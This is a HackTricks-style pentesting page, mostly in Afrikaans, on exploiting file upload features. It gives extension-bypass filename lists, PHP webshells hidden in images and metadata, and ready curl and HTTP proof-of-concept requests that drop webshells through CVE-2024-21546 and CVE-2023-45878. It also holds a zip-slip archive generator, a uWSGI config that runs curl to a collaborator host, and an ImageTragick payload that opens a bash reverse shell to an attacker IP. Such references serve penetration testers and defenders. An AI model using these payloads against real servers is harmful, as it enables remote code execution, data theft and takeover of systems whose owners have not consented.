# Lêeroplaai

{{#include ../../banners/hacktricks-training.md}}

## Algemene metodologie vir lêeroplaai

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Omseil kontrole van lêeruitbreidings

1. As dit van toepassing is, **kontroleer** die **vorige extensies.** Toets dit ook met 'n paar **hoofletters**: _pHp, .pHP5, .PhAr ..._
2. _Kontroleer **om 'n geldige extensie voor** die uitvoer-extensie by te voeg (gebruik ook die vorige extensies):_
- _file.png.php_
- _file.png.Php5_
3. Probeer om **spesiale karakters aan die einde** by te voeg. Jy kan Burp gebruik om **bruteforce** al die **ascii** en **Unicode** karakters. (_Let wel dat jy ook kan probeer om die **eerder** genoemde **extensies** te gebruik_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Probeer om die beskermings te omseil deur die server-side se extensie-parser te mislei met tegnieke soos die **verdubbeling** van die **extensie** of deur **rommeldata** (null bytes) tussen extensies by te voeg. _Jy kan ook die **vorige extensies** gebruik om 'n beter payload voor te berei._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Voeg **nog 'n laag van extensies** by by die vorige toets:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Probeer om die **uitvoerings-extensie voor die geldige extensie** te plaas en hoop die bediener verkeerd gekonfigureer is. (nuttig om Apache miskonfigurasies te benut waar enigiets met die uitbreiding .php, maar nie noodwendig wat eindig in .php nie, kode sal uitvoer):
- _ex: file.php.png_
7. Gebruik van **NTFS alternate data stream (ADS)** in **Windows**. In hierdie geval word 'n kolon karakter ":" ingevoeg na 'n verbode extensie en voor 'n toegelate een. As gevolg daarvan sal 'n **leë lêer met die verbode extensie** op die bediener geskep word (bv. "file.asax:.jpg"). Hierdie lêer kan later met ander tegnieke bewerk word, soos om sy kortlêernaam te gebruik. Die "**::$data**" patroon kan ook gebruik word om nie-leë lêers te skep. Daarom kan dit nuttig wees om 'n punt-karakter na hierdie patroon by te voeg om verdere beperkings te omseil (bv. "file.asp::$data.").
8. Probeer om lêernaam-limiete te breek. Die geldige extensie word afgekap en die kwaadwillige PHP bly oor. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Some upload handlers trim or normalize trailing dot characters from the saved filename. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) versions before 2.9.1, you can bypass extension validation by:

- Gebruik 'n geldige image MIME en magic header (bv. PNG se `\x89PNG\r\n\x1a\n`).
- Noem die opgelaaide lêer met 'n PHP-extensie gevolg deur 'n punt, bv. `shell.php.`.
- Die bediener verwyder die trailing dot en stoor `shell.php`, wat sal uitvoer as dit in 'n web-bedienerde gids geplaas word (standaard public storage soos `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Roep dan die gestoorde pad aan (tipies in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigasies:
- Opgradeer unisharp/laravel-filemanager na ≥ 2.9.1.
- Dwing streng server-side allowlists af en valideer die gestoorde bestandsnaam weer.
- Bedien uploads vanaf nie-uitvoerbare liggings.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Om **Content-Type** kontroles te omseil, stel die **value** van die **Content-Type** **header** op: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Om die **magic number** kontrole te omseil, voeg aan die begin van die lêer die **bytes of a real image** by (verwar die _file_ command). Of plaas die shell in die **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` of jy kan ook die **payload direk** in 'n image inbring:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- As **compressie by jou image gevoeg word**, byvoorbeeld met standaard PHP biblioteke soos [PHP-GD](https://www.php.net/manual/fr/book.image.php), sal die vorige tegnieke nie nuttig wees nie. Jy kan egter die **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat **compressie sal oorleef**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Die webblad kan ook die **image** hergroot, byvoorbeeld deur die PHP-GD funksies `imagecopyresized` of `imagecopyresampled`. Jy kan egter die **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat **compressie sal oorleef**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Nog 'n tegniek om 'n payload te maak wat **'n image hergrooting oorleef**, gebruik die PHP-GD funksie `thumbnailImage`. Jy kan egter die **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat **compressie sal oorleef**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Ander truuks om te toets

- Soek 'n kwesbaarheid om die reeds opgelaaide lêer te **herbenoem** (om die uitbreiding te verander).
- Vind 'n **Local File Inclusion** kwesbaarheid om die backdoor uit te voer.
- **Moontlike inligtingsopenbaring**:
1. Laai die **selfde lêer** **veelvuldige kere** op (en **tegelyk**) met dieselfde naam
2. Laai 'n lêer op met die **naam** van 'n **lêer** of **map** wat **alreeds bestaan**
3. Oplaai 'n lêer met **"." , "..", of "…" as sy naam**. Byvoorbeeld, in Apache op **Windows**, as die toepassing die opgelaaide lêers in die "/www/uploads/" gids stoor, sal die "." lêernaam 'n lêer genaamd
uploads” in die "/www/" gids skep.
4. Laai 'n lêer op wat nie maklik uitgevee kan word nie, soos **"…:.jpg"** in **NTFS**. (Windows)
5. Laai 'n lêer op in **Windows** met **ongeldige karakters** soos `|<>*?”` in sy naam. (Windows)
6. Laai 'n lêer op in **Windows** met **gereserveerde** (**verbode**) **name** soos CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Probeer ook om 'n **uitvoerbare lêer** (.exe) of 'n **.html** (minder verdag) op te laai wat **kode sal uitvoer** wanneer dit per ongeluk deur 'n slagoffer oopgemaak word.

### Spesiale extensie truuks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar` lêers is soos die `.jar` vir java, maar vir php, en kan **soos 'n php-lêer gebruik word** (uitgevoer met php, of ingesluit in 'n script...)

Die `.inc` uitbreiding word soms gebruik vir php-lêers wat slegs gebruik word om **lêers te importeer**, dus op 'n stadium kon iemand toegelaat het dat **hierdie uitbreiding uitgevoer word**.

## **Jetty RCE**

As jy 'n XML-lêer na 'n Jetty server kan oplaai, kan jy [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Soos in die volgende beeld vermeld, laai die XML-lêer op na `$JETTY_BASE/webapps/` en verwag die shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) kwesbaarhede kan uitgebuit word in uWSGI servers as iemand die vermoë het om die `.ini` konfigurasielêer te wysig. uWSGI konfigurasielêers gebruik 'n spesifieke sintaksis om "magic" veranderlikes, placeholders, en operators in te sluit. Aanmerkend is die '@' operator, gebruik as `@(filename)`, wat ontwerp is om die inhoud van 'n lêer in te sluit. Onder die verskeie ondersteunde skemas in uWSGI, is die "exec" skema besonder kragtig, aangesien dit die lees van data vanaf 'n proses se standaarduitset toelaat. Hierdie funksie kan gemanipuleer word vir bose doeleindes soos Remote Command Execution of Arbitrary File Write/Read wanneer 'n `.ini` konfigurasielêer verwerk word.

Oorweeg die volgende voorbeeld van 'n skadelike `uwsgi.ini` lêer, wat verskeie skemas demonstreer:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die uitvoering van die payload vind plaas tydens die parsing van die konfigurasielêer. Om die konfigurasie geaktiveer en geparse te hê, moet die uWSGI-proses óf herbegin word (byvoorbeeld na 'n crash of as gevolg van 'n Denial of Service attack) óf die lêer moet op auto-reload gestel wees. Die auto-reload-funksie, indien geaktiveer, herlaai die lêer op gespesifiseerde intervalle wanneer veranderinge opgespoor word.

Dit is belangrik om die slap aard van uWSGI se konfigurasielêer-parsing te verstaan. Spesifiek kan die bespreekte payload in 'n binêre lêer ingesit word (soos 'n image of PDF), wat die potensiële eksploitasie verder uitbrei.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Ongeauthentiseerde endpoint in Gibbon LMS laat arbitrary file write binne die web root toe, wat lei tot pre-auth RCE deur 'n PHP-lêer te plaas. Kwesbare weergawes: tot en met 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignoreer type/naam, decodeer die staart met base64)
- `path`: bestemmingslêernaam relatief tot Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: enige nie-leë waarde word aanvaar (e.g., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Drop 'n minimale webshell en voer opdragte uit:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Aantekeninge:
- Die handler voer `base64_decode($_POST["img"])` uit nadat dit gesplit is by `;` en `,`, en skryf dan bytes na `$absolutePath . '/' . $_POST['path']` sonder om extensie/tipe te valideer.
- Die resulterende kode hardloop as die webdienstgebruiker (bv. XAMPP Apache op Windows).

Verwysings vir hierdie fout sluit die usd HeroLab advisory en die NVD entry in. Sien die Verwysings-afdeling hieronder.

## **wget File Upload/SSRF Trick**

In sommige gevalle mag jy vind dat 'n bediener **`wget`** gebruik om **download files** en jy kan die **URL** aandui. In sulke gevalle mag die kode nagaan dat die uitbreiding van die afgelaaide lêers binne 'n whitelist is om te verseker dat slegs toegelate lêers afgelaai gaan word. Hierdie kontrole kan egter **omseil** word.\
Die **maksimum** lengte van 'n **filename** in **linux** is **255**, maar **wget** kap die filenames af tot **236** karakters. Jy kan **download** 'n lêer genaamd "A"*232+".php"+".gif", hierdie filename sal die **check** omseil (soos in hierdie voorbeeld is **".gif"** 'n **geldige** extensie) maar `wget` sal die lêer **hernoem** na **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Gereedskap

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is 'n kragtige tool ontwerp om Pentesters en Bug Hunters te help met die toetsing van file upload mechanisms. Dit maak gebruik van verskeie bug bounty techniques om die proses om vulnerabilities te identifiseer en te exploit te vereenvoudig, wat deeglike assessments van web applications verseker.

### Korrompering van upload-indekse met snprintf quirks (historiese)

Sommige legacy upload handlers wat `snprintf()` of iets soortgelyks gebruik om multi-file arrays van 'n single-file upload te bou, kan mislei word om die `_FILES` struktuur te vervals. As gevolg van inkonsekwenthede en afkapping in die gedrag van `snprintf()`, kan 'n sorgvuldig saamgestelde enkel-upload voorkom as verskeie geïndekseerde lêers aan die serverkant, wat logika verwar wat 'n streng vorm aanvaar (bv. dit as 'n multi-file upload beskou en onveilige takke neem). Alhoewel dit vandag nikaal is, kom hierdie “index corruption” patroon af en toe weer voor in CTFs en ouer codebases.

## Van File upload na ander vulnerabilities

- Stel **filename** op `../../../tmp/lol.png` en probeer 'n **path traversal** bereik
- Stel **filename** op `sleep(10)-- -.jpg` en jy mag 'n **SQL injection** kan bereik
- Stel **filename** op `<svg onload=alert(document.domain)>` om 'n **XSS** te bereik
- Stel **filename** op `; sleep 10;` om command injection te toets (meer [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Spesiaal saamgestelde PDFs vir XSS: Die [volgende bladsy verduidelik hoe om **PDF data te inject om JS uitvoering te verkry**](../xss-cross-site-scripting/pdf-injection.md). As jy PDFs kan upload, kan jy 'n PDF voorberei wat arbitraire JS sal uitvoer volgens die gegewe instruksies.
- Upload die \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) inhoud om te kyk of die server enige **antivirus** het
- Kyk of daar enige **size limit** is wanneer jy files upload

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar Lêer Outomaties gedekomprimeer by Upload

As jy 'n ZIP kan upload wat binne die server gedekomprimeer gaan word, kan jy twee dinge doen:

### Symlink

Upload 'n link wat soft links na ander files bevat, dan, deur toegang tot die gedekomprimeerde lêers, sal jy toegang hê tot die gelinkte lêers:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Ontpak in verskillende gidse

Die onverwagte skepping van lêers in gidse tydens ontpak is 'n ernstige probleem. Ten spyte van aanvanklike veronderstellings dat hierdie opstelling dalk teen OS-level command execution deur malicious file uploads sal beskerm, kan die hiërargiese kompressieondersteuning en directory traversal vermoëns van die ZIP archive format uitgebuit word. Dit laat aanvallers toe om beperkings te omseil en uit veilige upload directories te ontsnap deur die ontpakkingsfunksionaliteit van die geteikende toepassing te manipuleer.

'n Outomatiese exploit om sulke lêers te vervaardig is beskikbaar by [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Die utility kan soos volg gebruik word:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Verder is die **symlink trick with evilarc** ook 'n opsie. As die doel is om 'n lêer soos `/flag.txt` te teiken, moet 'n symlink na daardie lêer in jou stelsel geskep word. Dit verseker dat evilarc nie foute ervaar tydens sy werking nie.

Below is an example of Python code used to create a malicious zip file:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Misbruik van kompressie vir file spraying**

Vir meer besonderhede **kyk na die oorspronklike pos op**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP-code word geskryf om opdragte uit te voer wat deur die `$_REQUEST`-veranderlike deurgegee word.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Verskeie lêers word geskep en 'n zip-argief word saamgestel wat hierdie lêers bevat.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Die name van die lêers binne die zip word met vi of 'n hex-editor aangepas, deur "xxA" na "../" te verander om deur gidse te navigeer.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Laai hierdie inhoud op met 'n beeld-lêeruitbreiding om die kwetsbaarheid te misbruik **(ImageMagick , 7.0.1-1)** (van die [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Insluiting van PHP Shell in PNG

Om 'n PHP shell in die IDAT chunk van 'n PNG-lêer in te sluit kan sekere beeldverwerkingsoperasies effektief omseil. Die funksies `imagecopyresized` en `imagecopyresampled` van PHP-GD is besonder relevant in hierdie konteks, aangesien hulle algemeen gebruik word vir die resizing en resampling van beelde, onderskeidelik. Die vermoë van die ingeslote PHP shell om onaangeraak te bly deur hierdie operasies is 'n beduidende voordeel vir sekere gebruiksgevalle.

'N Gedetailleerde ondersoek van hierdie tegniek, insluitende die metodologie en potensiële toepassings, word in die volgende artikel verskaf: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Hierdie bron bied 'n omvattende begrip van die proses en sy implikasies.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files dien as 'n unieke hulpmiddel in kuberveiligheid, optreeend as kameleons wat geldig in meerdere lêerformate terselfdertyd kan bestaan. 'n Interessante voorbeeld is 'n [GIFAR](https://en.wikipedia.org/wiki/Gifar), 'n hibriede wat beide as 'n GIF en 'n RAR-argief funksioneer. Sulke lêers is nie beperk tot hierdie kombinasie nie; kombinasies soos GIF en JS of PPT en JS is ook uitvoerbaar.

Die kernnut van polyglot files lê in hul vermoë om sekuriteitsmaatreëls te omseil wat lêers op grond van tipe ondersoek. Algemene praktyk in verskeie toepassings behels dat slegs sekere lêertipes vir upload toegelaat word—soos JPEG, GIF of DOC—om die risiko wat deur potensieel skadelike formate (bv. JS, PHP of Phar-lêers) geskep word, te verminder. 'n Polyglot, deur aan die strukturele vereistes van meerdere lêertipes te voldoen, kan egter stilweg hierdie beperkings omseil.

Ten spyte van hul aanpasbaarheid, ondervind polyglots beperkings. Byvoorbeeld, terwyl 'n polyglot terselfdetyd 'n PHAR-lêer (PHp ARchive) en 'n JPEG kan beliggaam, kan die sukses van die upload afhang van die platform se beleid oor lêeruitbreidings. As die stelsel streng is oor toelaatbare uitbreidings, mag die bloot strukturele dualiteit van 'n polyglot nie voldoende wees om 'n upload te waarborg nie.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Laai geldige JSONs op asof dit 'n PDF was

Hoe om lêertipe-detektering te vermy deur 'n geldige JSON-lêer op te laai al word dit nie toegelaat nie deur 'n vals PDF-lêer voor te gee (tegnieke uit **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Solank die `%PDF` magic bytes in die eerste 1024 bytes is, is dit geldig (sien voorbeeld in die pos)
- **`pdflib` library**: Voeg 'n vals PDF-formaat binne 'n veld van die JSON by sodat die library dink dit is 'n PDF (sien voorbeeld in die pos)
- **`file` binary**: Dit kan tot 1048576 bytes van 'n lêer lees. Skep net 'n JSON groter as dit sodat dit nie die inhoud as 'n json kan parse nie, en plaas dan binne die JSON die aanvanklike deel van 'n werklike PDF en dit sal dink dit is 'n PDF

## Verwysings

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
